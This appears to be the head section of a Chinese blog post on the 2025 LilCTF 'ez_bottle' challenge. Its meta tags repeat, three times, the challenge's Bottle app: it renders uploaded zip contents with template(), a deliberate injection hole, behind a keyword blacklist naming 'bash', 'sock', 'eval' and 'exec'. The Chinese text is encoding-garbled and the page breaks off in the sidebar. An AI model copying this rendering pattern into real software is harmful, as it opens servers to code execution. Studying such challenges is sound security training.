<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" ez_bottle è€ƒç‚¹ï¼šabortå›æ˜¾+å…¨è§’å­—ç¬¦ç»•è¿‡open 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 from bottle import route, run, template, post, request, static_file, error import os import zipfile import hashlib import time # æç¤ºï¼šflagåœ¨/flagè·¯å¾„ä¸‹ï¼Œå¯ä»¥å°è¯•è·å– # ä¸Šä¼ æ–‡ä»¶å­˜å‚¨ç›®å½• UPLOAD_DIR = os.path.join(os.path.dirname(__file__), &#39;uploads&#39;) # ç¡®ä¿ä¸Šä¼ ç›®å½•å­˜åœ¨ os.makedirs(UPLOAD_DIR, exist_ok=True) # é™æ€æ–‡ä»¶ç›®å½• STATIC_DIR = os.path.join(os.path.dirname(__file__), &#39;static&#39;) # æœ€å¤§æ–‡ä»¶å¤§å°é™åˆ¶ï¼ˆ1MBï¼‰ MAX_FILE_SIZE = 1 * 1024 * 1024 # é»‘åå•å…³é”®è¯ï¼Œé˜²æ­¢æ¶æ„ä»£ç  BLACK_DICT = [&#34;{&#34;, &#34;}&#34;, &#34;os&#34;, &#34;eval&#34;, &#34;exec&#34;, &#34;sock&#34;, &#34;&lt;&#34;, &#34;&gt;&#34;, &#34;bul&#34;, &#34;class&#34;, &#34;?&#34;, &#34;:&#34;, &#34;bash&#34;, &#34;_&#34;, &#34;globals&#34;, &#34;get&#34;, &#34;open&#34;] def contains_blacklist(content): &#34;&#34;&#34;æ£€æŸ¥å†…å®¹æ˜¯å¦åŒ…å«é»‘åå•å…³é”®è¯&#34;&#34;&#34; return any(black in content for black in BLACK_DICT) def is_symlink(zipinfo): &#34;&#34;&#34;æ£€æŸ¥zipæ¡ç›®æ˜¯å¦æ˜¯ç¬¦å·é“¾æ¥&#34;&#34;&#34; return (zipinfo.external_attr &gt;&gt; 16) &amp; 0o170000 == 0o120000 def is_safe_path(base_dir, target_path): &#34;&#34;&#34;æ£€æŸ¥ç›®æ ‡è·¯å¾„æ˜¯å¦åœ¨åŸºç¡€ç›®å½•å†…ï¼ˆé˜²æ­¢è·¯å¾„éå†æ”»å‡»ï¼‰&#34;&#34;&#34; return os.path.realpath(target_path).startswith(os.path.realpath(base_dir)) @route(&#39;/&#39;) def index(): &#34;&#34;&#34;è¿”å›é¦–é¡µ&#34;&#34;&#34; return static_file(&#39;index.html&#39;, root=STATIC_DIR) @route(&#39;/static/&lt;filename&gt;&#39;) def server_static(filename): &#34;&#34;&#34;æä¾›é™æ€æ–‡ä»¶æœåŠ¡&#34;&#34;&#34; return static_file(filename, root=STATIC_DIR) @route(&#39;/upload&#39;) def upload_page(): &#34;&#34;&#34;è¿”å›ä¸Šä¼ é¡µé¢&#34;&#34;&#34; return static_file(&#39;upload.html&#39;, root=STATIC_DIR) @post(&#39;/upload&#39;) def upload(): &#34;&#34;&#34;å¤„ç†æ–‡ä»¶ä¸Šä¼ &#34;&#34;&#34; # è·å–ä¸Šä¼ çš„zipæ–‡ä»¶ zip_file = request.files.get(&#39;file&#39;) # æ£€æŸ¥æ˜¯å¦æ˜¯zipæ–‡ä»¶ if not zip_file or not zip_file.filename.endswith(&#39;.zip&#39;): return &#39;æ— æ•ˆæ–‡ä»¶ï¼Œè¯·ä¸Šä¼ ZIPæ–‡ä»¶ã€‚&#39; # æ£€æŸ¥æ–‡ä»¶å¤§å° if len(zip_file.file.read()) &gt; MAX_FILE_SIZE: return &#39;æ–‡ä»¶å¤§å°è¶…è¿‡1MBé™åˆ¶ï¼Œè¯·ä¸Šä¼ æ›´å°çš„æ–‡ä»¶ã€‚&#39; zip_file.file.seek(0) # ç”Ÿæˆå”¯ä¸€ç›®å½•å current_time = str(time.time()) unique_string = zip_file.filename + current_time md5_hash = hashlib.md5(unique_string.encode()).hexdigest() extract_dir = os.path.join(UPLOAD_DIR, md5_hash) os.makedirs(extract_dir) # ä¿å­˜zipæ–‡ä»¶ zip_path = os.path.join(extract_dir, &#39;upload.zip&#39;) zip_file.save(zip_path) try: with zipfile.ZipFile(zip_path, &#39;r&#39;) as z: for file_info in z.infolist(): # æ£€æŸ¥æ˜¯å¦åŒ…å«ç¬¦å·é“¾æ¥ if is_symlink(file_info): return &#39;ä¸å…è®¸åŒ…å«ç¬¦å·é“¾æ¥ã€‚&#39; # æ£€æŸ¥è·¯å¾„å®‰å…¨æ€§ real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename)) if not is_safe_path(extract_dir, real_dest_path): return &#39;æ£€æµ‹åˆ°è·¯å¾„éå†æ”»å‡»ã€‚&#39; # è§£å‹æ–‡ä»¶ z.extractall(extract_dir) except zipfile.BadZipFile: return &#39;æ— æ•ˆçš„ZIPæ–‡ä»¶ã€‚&#39; # è·å–è§£å‹åçš„æ–‡ä»¶åˆ—è¡¨ files = os.listdir(extract_dir) files.remove(&#39;upload.zip&#39;) # è¿”å›æ–‡ä»¶åˆ—è¡¨å’Œè®¿é—®é“¾æ¥ return template(&#34;æ–‡ä»¶åˆ—è¡¨: {{files}}\\nè®¿é—®: /view/{{md5}}/{{first_file}}&#34;, files=&#34;, &#34;.join(files), md5=md5_hash, first_file=files[0] if files else &#34;nofile&#34;) @route(&#39;/view/&lt;md5&gt;/&lt;filename&gt;&#39;) def view_file(md5, filename): &#34;&#34;&#34;æŸ¥çœ‹ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹&#34;&#34;&#34; file_path = os.path.join(UPLOAD_DIR, md5, filename) if not os.path.exists(file_path): return &#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚&#34; # è¯»å–æ–‡ä»¶å†…å®¹ with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f: content = f.read() # æ£€æŸ¥é»‘åå•å†…å®¹ if contains_blacklist(content): return &#34;æ£€æµ‹åˆ°æ¶æ„å†…å®¹ï¼ç¦æ­¢è®¿é—®ï¼ï¼ï¼&#34; try: # æ¸²æŸ“æ–‡ä»¶å†…å®¹ï¼ˆæ³¨æ„ï¼šè¿™é‡Œä½¿ç”¨æ¨¡æ¿æ¸²æŸ“å¯èƒ½å­˜åœ¨å®‰å…¨éšæ‚£ï¼‰ return template(content) except Exception as e: return f&#34;æ¸²æŸ“æ¨¡æ¿å‡ºé”™: {str(e)}&#34; @error(404) def error404(error): &#34;&#34;&#34;404é”™è¯¯å¤„ç†&#34;&#34;&#34; return &#34;bbbbbboooottle&#34; @error(403) def error403(error): &#34;&#34;&#34;403é”™è¯¯å¤„ç†&#34;&#34;&#34; return &#34;ç¦æ­¢è®¿é—®ï¼šæ‚¨æ²¡æœ‰æƒé™è®¿é—®æ­¤èµ„æºã€‚&#34; if __name__ == &#39;__main__&#39;: # å¯åŠ¨webæœåŠ¡ run(host=&#39;0.0.0.0&#39;, port=5000, debug=False) é¢˜ç›®é€»è¾‘å¾ˆç®€ç­”ï¼Œæ„é€ ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ä¸Šä¼ ä¸€ä¸ªzipï¼Œzipé‡Œæ–‡ä»¶å†…å®¹ä¼šè¢«æ¸²æŸ“ï¼Œä¸»è¦æ˜¯æ€ä¹ˆç»•è¿‡wafã€‚è¿™é¢˜ä»£ç æ²¡ç»™å…¨ï¼Œæˆ‘æœ¬åœ°æµ‹æ€»æ˜¯è¢«404å¤„ç†ï¼Œéå¸¸éš¾å—ï¼Œä¸çŸ¥é“æ˜¯æ— å›æ˜¾è¿˜æ˜¯å›æ˜¾ï¼Œä¸è¿‡æ ¹æ®æˆ‘ä¹‹å‰æ‰“bottleçš„é¢˜ç›®ï¼Œæ‰“çš„æ˜¯abortå›æ˜¾ï¼Œ\n">
<title>2025-LilCTF</title>

<link rel='canonical' href='https://luo-kaihong.github.io/p/2025-lilctf/'>

<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="2025-LilCTF">
<meta property='og:description' content=" ez_bottle è€ƒç‚¹ï¼šabortå›æ˜¾+å…¨è§’å­—ç¬¦ç»•è¿‡open 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 from bottle import route, run, template, post, request, static_file, error import os import zipfile import hashlib import time # æç¤ºï¼šflagåœ¨/flagè·¯å¾„ä¸‹ï¼Œå¯ä»¥å°è¯•è·å– # ä¸Šä¼ æ–‡ä»¶å­˜å‚¨ç›®å½• UPLOAD_DIR = os.path.join(os.path.dirname(__file__), &#39;uploads&#39;) # ç¡®ä¿ä¸Šä¼ ç›®å½•å­˜åœ¨ os.makedirs(UPLOAD_DIR, exist_ok=True) # é™æ€æ–‡ä»¶ç›®å½• STATIC_DIR = os.path.join(os.path.dirname(__file__), &#39;static&#39;) # æœ€å¤§æ–‡ä»¶å¤§å°é™åˆ¶ï¼ˆ1MBï¼‰ MAX_FILE_SIZE = 1 * 1024 * 1024 # é»‘åå•å…³é”®è¯ï¼Œé˜²æ­¢æ¶æ„ä»£ç  BLACK_DICT = [&#34;{&#34;, &#34;}&#34;, &#34;os&#34;, &#34;eval&#34;, &#34;exec&#34;, &#34;sock&#34;, &#34;&lt;&#34;, &#34;&gt;&#34;, &#34;bul&#34;, &#34;class&#34;, &#34;?&#34;, &#34;:&#34;, &#34;bash&#34;, &#34;_&#34;, &#34;globals&#34;, &#34;get&#34;, &#34;open&#34;] def contains_blacklist(content): &#34;&#34;&#34;æ£€æŸ¥å†…å®¹æ˜¯å¦åŒ…å«é»‘åå•å…³é”®è¯&#34;&#34;&#34; return any(black in content for black in BLACK_DICT) def is_symlink(zipinfo): &#34;&#34;&#34;æ£€æŸ¥zipæ¡ç›®æ˜¯å¦æ˜¯ç¬¦å·é“¾æ¥&#34;&#34;&#34; return (zipinfo.external_attr &gt;&gt; 16) &amp; 0o170000 == 0o120000 def is_safe_path(base_dir, target_path): &#34;&#34;&#34;æ£€æŸ¥ç›®æ ‡è·¯å¾„æ˜¯å¦åœ¨åŸºç¡€ç›®å½•å†…ï¼ˆé˜²æ­¢è·¯å¾„éå†æ”»å‡»ï¼‰&#34;&#34;&#34; return os.path.realpath(target_path).startswith(os.path.realpath(base_dir)) @route(&#39;/&#39;) def index(): &#34;&#34;&#34;è¿”å›é¦–é¡µ&#34;&#34;&#34; return static_file(&#39;index.html&#39;, root=STATIC_DIR) @route(&#39;/static/&lt;filename&gt;&#39;) def server_static(filename): &#34;&#34;&#34;æä¾›é™æ€æ–‡ä»¶æœåŠ¡&#34;&#34;&#34; return static_file(filename, root=STATIC_DIR) @route(&#39;/upload&#39;) def upload_page(): &#34;&#34;&#34;è¿”å›ä¸Šä¼ é¡µé¢&#34;&#34;&#34; return static_file(&#39;upload.html&#39;, root=STATIC_DIR) @post(&#39;/upload&#39;) def upload(): &#34;&#34;&#34;å¤„ç†æ–‡ä»¶ä¸Šä¼ &#34;&#34;&#34; # è·å–ä¸Šä¼ çš„zipæ–‡ä»¶ zip_file = request.files.get(&#39;file&#39;) # æ£€æŸ¥æ˜¯å¦æ˜¯zipæ–‡ä»¶ if not zip_file or not zip_file.filename.endswith(&#39;.zip&#39;): return &#39;æ— æ•ˆæ–‡ä»¶ï¼Œè¯·ä¸Šä¼ ZIPæ–‡ä»¶ã€‚&#39; # æ£€æŸ¥æ–‡ä»¶å¤§å° if len(zip_file.file.read()) &gt; MAX_FILE_SIZE: return &#39;æ–‡ä»¶å¤§å°è¶…è¿‡1MBé™åˆ¶ï¼Œè¯·ä¸Šä¼ æ›´å°çš„æ–‡ä»¶ã€‚&#39; zip_file.file.seek(0) # ç”Ÿæˆå”¯ä¸€ç›®å½•å current_time = str(time.time()) unique_string = zip_file.filename + current_time md5_hash = hashlib.md5(unique_string.encode()).hexdigest() extract_dir = os.path.join(UPLOAD_DIR, md5_hash) os.makedirs(extract_dir) # ä¿å­˜zipæ–‡ä»¶ zip_path = os.path.join(extract_dir, &#39;upload.zip&#39;) zip_file.save(zip_path) try: with zipfile.ZipFile(zip_path, &#39;r&#39;) as z: for file_info in z.infolist(): # æ£€æŸ¥æ˜¯å¦åŒ…å«ç¬¦å·é“¾æ¥ if is_symlink(file_info): return &#39;ä¸å…è®¸åŒ…å«ç¬¦å·é“¾æ¥ã€‚&#39; # æ£€æŸ¥è·¯å¾„å®‰å…¨æ€§ real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename)) if not is_safe_path(extract_dir, real_dest_path): return &#39;æ£€æµ‹åˆ°è·¯å¾„éå†æ”»å‡»ã€‚&#39; # è§£å‹æ–‡ä»¶ z.extractall(extract_dir) except zipfile.BadZipFile: return &#39;æ— æ•ˆçš„ZIPæ–‡ä»¶ã€‚&#39; # è·å–è§£å‹åçš„æ–‡ä»¶åˆ—è¡¨ files = os.listdir(extract_dir) files.remove(&#39;upload.zip&#39;) # è¿”å›æ–‡ä»¶åˆ—è¡¨å’Œè®¿é—®é“¾æ¥ return template(&#34;æ–‡ä»¶åˆ—è¡¨: {{files}}\\nè®¿é—®: /view/{{md5}}/{{first_file}}&#34;, files=&#34;, &#34;.join(files), md5=md5_hash, first_file=files[0] if files else &#34;nofile&#34;) @route(&#39;/view/&lt;md5&gt;/&lt;filename&gt;&#39;) def view_file(md5, filename): &#34;&#34;&#34;æŸ¥çœ‹ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹&#34;&#34;&#34; file_path = os.path.join(UPLOAD_DIR, md5, filename) if not os.path.exists(file_path): return &#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚&#34; # è¯»å–æ–‡ä»¶å†…å®¹ with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f: content = f.read() # æ£€æŸ¥é»‘åå•å†…å®¹ if contains_blacklist(content): return &#34;æ£€æµ‹åˆ°æ¶æ„å†…å®¹ï¼ç¦æ­¢è®¿é—®ï¼ï¼ï¼&#34; try: # æ¸²æŸ“æ–‡ä»¶å†…å®¹ï¼ˆæ³¨æ„ï¼šè¿™é‡Œä½¿ç”¨æ¨¡æ¿æ¸²æŸ“å¯èƒ½å­˜åœ¨å®‰å…¨éšæ‚£ï¼‰ return template(content) except Exception as e: return f&#34;æ¸²æŸ“æ¨¡æ¿å‡ºé”™: {str(e)}&#34; @error(404) def error404(error): &#34;&#34;&#34;404é”™è¯¯å¤„ç†&#34;&#34;&#34; return &#34;bbbbbboooottle&#34; @error(403) def error403(error): &#34;&#34;&#34;403é”™è¯¯å¤„ç†&#34;&#34;&#34; return &#34;ç¦æ­¢è®¿é—®ï¼šæ‚¨æ²¡æœ‰æƒé™è®¿é—®æ­¤èµ„æºã€‚&#34; if __name__ == &#39;__main__&#39;: # å¯åŠ¨webæœåŠ¡ run(host=&#39;0.0.0.0&#39;, port=5000, debug=False) é¢˜ç›®é€»è¾‘å¾ˆç®€ç­”ï¼Œæ„é€ ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ä¸Šä¼ ä¸€ä¸ªzipï¼Œzipé‡Œæ–‡ä»¶å†…å®¹ä¼šè¢«æ¸²æŸ“ï¼Œä¸»è¦æ˜¯æ€ä¹ˆç»•è¿‡wafã€‚è¿™é¢˜ä»£ç æ²¡ç»™å…¨ï¼Œæˆ‘æœ¬åœ°æµ‹æ€»æ˜¯è¢«404å¤„ç†ï¼Œéå¸¸éš¾å—ï¼Œä¸çŸ¥é“æ˜¯æ— å›æ˜¾è¿˜æ˜¯å›æ˜¾ï¼Œä¸è¿‡æ ¹æ®æˆ‘ä¹‹å‰æ‰“bottleçš„é¢˜ç›®ï¼Œæ‰“çš„æ˜¯abortå›æ˜¾ï¼Œ\n">
<meta property='og:url' content='https://luo-kaihong.github.io/p/2025-lilctf/'>
<meta property='og:site_name' content='ç½—é“ é¸¿'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-08-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-08-15T00:00:00&#43;00:00'/>
<meta name="twitter:title" content="2025-LilCTF">
<meta name="twitter:description" content=" ez_bottle è€ƒç‚¹ï¼šabortå›æ˜¾+å…¨è§’å­—ç¬¦ç»•è¿‡open 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 from bottle import route, run, template, post, request, static_file, error import os import zipfile import hashlib import time # æç¤ºï¼šflagåœ¨/flagè·¯å¾„ä¸‹ï¼Œå¯ä»¥å°è¯•è·å– # ä¸Šä¼ æ–‡ä»¶å­˜å‚¨ç›®å½• UPLOAD_DIR = os.path.join(os.path.dirname(__file__), &#39;uploads&#39;) # ç¡®ä¿ä¸Šä¼ ç›®å½•å­˜åœ¨ os.makedirs(UPLOAD_DIR, exist_ok=True) # é™æ€æ–‡ä»¶ç›®å½• STATIC_DIR = os.path.join(os.path.dirname(__file__), &#39;static&#39;) # æœ€å¤§æ–‡ä»¶å¤§å°é™åˆ¶ï¼ˆ1MBï¼‰ MAX_FILE_SIZE = 1 * 1024 * 1024 # é»‘åå•å…³é”®è¯ï¼Œé˜²æ­¢æ¶æ„ä»£ç  BLACK_DICT = [&#34;{&#34;, &#34;}&#34;, &#34;os&#34;, &#34;eval&#34;, &#34;exec&#34;, &#34;sock&#34;, &#34;&lt;&#34;, &#34;&gt;&#34;, &#34;bul&#34;, &#34;class&#34;, &#34;?&#34;, &#34;:&#34;, &#34;bash&#34;, &#34;_&#34;, &#34;globals&#34;, &#34;get&#34;, &#34;open&#34;] def contains_blacklist(content): &#34;&#34;&#34;æ£€æŸ¥å†…å®¹æ˜¯å¦åŒ…å«é»‘åå•å…³é”®è¯&#34;&#34;&#34; return any(black in content for black in BLACK_DICT) def is_symlink(zipinfo): &#34;&#34;&#34;æ£€æŸ¥zipæ¡ç›®æ˜¯å¦æ˜¯ç¬¦å·é“¾æ¥&#34;&#34;&#34; return (zipinfo.external_attr &gt;&gt; 16) &amp; 0o170000 == 0o120000 def is_safe_path(base_dir, target_path): &#34;&#34;&#34;æ£€æŸ¥ç›®æ ‡è·¯å¾„æ˜¯å¦åœ¨åŸºç¡€ç›®å½•å†…ï¼ˆé˜²æ­¢è·¯å¾„éå†æ”»å‡»ï¼‰&#34;&#34;&#34; return os.path.realpath(target_path).startswith(os.path.realpath(base_dir)) @route(&#39;/&#39;) def index(): &#34;&#34;&#34;è¿”å›é¦–é¡µ&#34;&#34;&#34; return static_file(&#39;index.html&#39;, root=STATIC_DIR) @route(&#39;/static/&lt;filename&gt;&#39;) def server_static(filename): &#34;&#34;&#34;æä¾›é™æ€æ–‡ä»¶æœåŠ¡&#34;&#34;&#34; return static_file(filename, root=STATIC_DIR) @route(&#39;/upload&#39;) def upload_page(): &#34;&#34;&#34;è¿”å›ä¸Šä¼ é¡µé¢&#34;&#34;&#34; return static_file(&#39;upload.html&#39;, root=STATIC_DIR) @post(&#39;/upload&#39;) def upload(): &#34;&#34;&#34;å¤„ç†æ–‡ä»¶ä¸Šä¼ &#34;&#34;&#34; # è·å–ä¸Šä¼ çš„zipæ–‡ä»¶ zip_file = request.files.get(&#39;file&#39;) # æ£€æŸ¥æ˜¯å¦æ˜¯zipæ–‡ä»¶ if not zip_file or not zip_file.filename.endswith(&#39;.zip&#39;): return &#39;æ— æ•ˆæ–‡ä»¶ï¼Œè¯·ä¸Šä¼ ZIPæ–‡ä»¶ã€‚&#39; # æ£€æŸ¥æ–‡ä»¶å¤§å° if len(zip_file.file.read()) &gt; MAX_FILE_SIZE: return &#39;æ–‡ä»¶å¤§å°è¶…è¿‡1MBé™åˆ¶ï¼Œè¯·ä¸Šä¼ æ›´å°çš„æ–‡ä»¶ã€‚&#39; zip_file.file.seek(0) # ç”Ÿæˆå”¯ä¸€ç›®å½•å current_time = str(time.time()) unique_string = zip_file.filename + current_time md5_hash = hashlib.md5(unique_string.encode()).hexdigest() extract_dir = os.path.join(UPLOAD_DIR, md5_hash) os.makedirs(extract_dir) # ä¿å­˜zipæ–‡ä»¶ zip_path = os.path.join(extract_dir, &#39;upload.zip&#39;) zip_file.save(zip_path) try: with zipfile.ZipFile(zip_path, &#39;r&#39;) as z: for file_info in z.infolist(): # æ£€æŸ¥æ˜¯å¦åŒ…å«ç¬¦å·é“¾æ¥ if is_symlink(file_info): return &#39;ä¸å…è®¸åŒ…å«ç¬¦å·é“¾æ¥ã€‚&#39; # æ£€æŸ¥è·¯å¾„å®‰å…¨æ€§ real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename)) if not is_safe_path(extract_dir, real_dest_path): return &#39;æ£€æµ‹åˆ°è·¯å¾„éå†æ”»å‡»ã€‚&#39; # è§£å‹æ–‡ä»¶ z.extractall(extract_dir) except zipfile.BadZipFile: return &#39;æ— æ•ˆçš„ZIPæ–‡ä»¶ã€‚&#39; # è·å–è§£å‹åçš„æ–‡ä»¶åˆ—è¡¨ files = os.listdir(extract_dir) files.remove(&#39;upload.zip&#39;) # è¿”å›æ–‡ä»¶åˆ—è¡¨å’Œè®¿é—®é“¾æ¥ return template(&#34;æ–‡ä»¶åˆ—è¡¨: {{files}}\\nè®¿é—®: /view/{{md5}}/{{first_file}}&#34;, files=&#34;, &#34;.join(files), md5=md5_hash, first_file=files[0] if files else &#34;nofile&#34;) @route(&#39;/view/&lt;md5&gt;/&lt;filename&gt;&#39;) def view_file(md5, filename): &#34;&#34;&#34;æŸ¥çœ‹ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹&#34;&#34;&#34; file_path = os.path.join(UPLOAD_DIR, md5, filename) if not os.path.exists(file_path): return &#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚&#34; # è¯»å–æ–‡ä»¶å†…å®¹ with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f: content = f.read() # æ£€æŸ¥é»‘åå•å†…å®¹ if contains_blacklist(content): return &#34;æ£€æµ‹åˆ°æ¶æ„å†…å®¹ï¼ç¦æ­¢è®¿é—®ï¼ï¼ï¼&#34; try: # æ¸²æŸ“æ–‡ä»¶å†…å®¹ï¼ˆæ³¨æ„ï¼šè¿™é‡Œä½¿ç”¨æ¨¡æ¿æ¸²æŸ“å¯èƒ½å­˜åœ¨å®‰å…¨éšæ‚£ï¼‰ return template(content) except Exception as e: return f&#34;æ¸²æŸ“æ¨¡æ¿å‡ºé”™: {str(e)}&#34; @error(404) def error404(error): &#34;&#34;&#34;404é”™è¯¯å¤„ç†&#34;&#34;&#34; return &#34;bbbbbboooottle&#34; @error(403) def error403(error): &#34;&#34;&#34;403é”™è¯¯å¤„ç†&#34;&#34;&#34; return &#34;ç¦æ­¢è®¿é—®ï¼šæ‚¨æ²¡æœ‰æƒé™è®¿é—®æ­¤èµ„æºã€‚&#34; if __name__ == &#39;__main__&#39;: # å¯åŠ¨webæœåŠ¡ run(host=&#39;0.0.0.0&#39;, port=5000, debug=False) é¢˜ç›®é€»è¾‘å¾ˆç®€ç­”ï¼Œæ„é€ ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ä¸Šä¼ ä¸€ä¸ªzipï¼Œzipé‡Œæ–‡ä»¶å†…å®¹ä¼šè¢«æ¸²æŸ“ï¼Œä¸»è¦æ˜¯æ€ä¹ˆç»•è¿‡wafã€‚è¿™é¢˜ä»£ç æ²¡ç»™å…¨ï¼Œæˆ‘æœ¬åœ°æµ‹æ€»æ˜¯è¢«404å¤„ç†ï¼Œéå¸¸éš¾å—ï¼Œä¸çŸ¥é“æ˜¯æ— å›æ˜¾è¿˜æ˜¯å›æ˜¾ï¼Œä¸è¿‡æ ¹æ®æˆ‘ä¹‹å‰æ‰“bottleçš„é¢˜ç›®ï¼Œæ‰“çš„æ˜¯abortå›æ˜¾ï¼Œ\n">
    <link rel="shortcut icon" href="/favicon.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_b0f9889609c95e4e.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ’—</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">ç½—é“ é¸¿</a></h1>
            <h2 class="site-description"></h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://mpbeta.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.10336'
                        target="_blank"
                        title="csdn"
                        rel="me"
                    >
                        
                        
                            <?xml version="1.0" ?><!DOCTYPE svg  PUBLIC '-//W3C//DTD SVG 1.1//EN'  'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><svg enable-background="new 0 0 156.457 156.457" height="156.457" id="Layer_1" overflow="visible" version="1.1" viewBox="0 0 156.457 156.457" width="156.457" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="icon"><circle cx="78.229" cy="78.229" fill="#EF7A2B" r="78.229"/><path d="M64.616,117.315c-9.653-0.584-16.453-4.751-19.793-12.154c-1.493-3.292-2.118-6.459-2.153-10.876   c-0.021-2.306,0.403-27.915,0.549-33.193c0.146-5.563,1.188-9.532,3.424-13.019c3.174-4.969,7.667-7.785,14.265-8.879   c2.542-0.424,24.8-0.875,26.96-0.521c5.001,0.827,8.932,2.858,12.224,6.306c2.694,2.823,4.444,6.236,5.257,10.271   c0.563,2.816,0.625,9.584,0.104,12.345c-0.194,0.983-0.223,1.386-0.104,1.386c0.091,0,0.868,0.066,1.716,0.149   c3.403,0.319,5.966,1.132,7.91,2.503c3.396,2.389,5,5.661,5.368,10.928c0.223,3.098,0.181,11.348-0.055,13.293   c-0.792,6.25-2.952,10.979-6.765,14.778c-3.577,3.57-7.737,5.57-13.522,6.501c-1.306,0.208-3.326,0.236-17.467,0.264   C73.735,117.412,65.672,117.371,64.616,117.315L64.616,117.315L64.616,117.315z M99.202,99.036   c1.285-0.334,2.153-0.819,3.091-1.765c2.188-2.194,2.632-5.319,1.16-8.209c-0.417-0.813-1.64-2.027-2.584-2.556   c-1.659-0.931-0.902-0.889-19.335-0.889c-14.862,0-16.786,0.021-17.612,0.223c-3.07,0.757-5.139,3.417-5.139,6.598   c0,1.938,0.66,3.535,2.021,4.868c0.931,0.91,1.632,1.326,2.896,1.688c0.785,0.229,2.097,0.25,17.745,0.264   C96.376,99.258,98.438,99.237,99.202,99.036L99.202,99.036z M85.841,67.988c0.444-0.167,1.139-0.552,1.541-0.854   c4.438-3.333,3.334-10.125-1.958-12.008c-0.569-0.205-1.515-0.267-5.376-0.368c-8.25-0.208-13.695-0.188-14.445,0.052   c-1.194,0.385-2.167,0.972-2.965,1.785c-3.57,3.615-2.167,9.55,2.667,11.275c0.729,0.264,1.34,0.302,6.424,0.417   C83.465,68.551,84.382,68.533,85.841,67.988L85.841,67.988L85.841,67.988z" fill="#FFFFFF"/></g></svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/CaiJimmy/hugo-theme-stack'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
